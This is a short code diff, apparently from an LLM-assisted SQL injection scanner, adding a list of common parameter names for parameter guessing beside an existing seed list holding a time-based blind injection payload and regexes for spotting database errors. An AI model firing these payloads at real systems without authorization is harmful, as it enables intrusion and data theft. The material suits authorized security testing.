@@ -22,6 +22,16 @@ SEED_PAYLOADS = [
     "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
 ]
 
+# Common parameter names to guess when a URL exposes none (param mining).
+# Ordered by how often they carry injectable values in real APIs.
+COMMON_PARAMS = [
+    "query", "q", "id", "search", "s", "name", "user", "username", "email",
+    "cat", "category", "filter", "sort", "order", "orderby", "field", "column",
+    "table", "sql", "keyword", "term", "value", "val", "key", "page", "limit",
+    "offset", "product", "item", "pid", "uid", "type", "action", "view",
+    "lang", "ref", "url", "path", "file", "dir", "date", "from", "to", "code",
+]
+
 # Regex patterns for quick pre-LLM triage
 SQL_ERROR_PATTERNS = [
     r"SQL syntax.*MySQL",
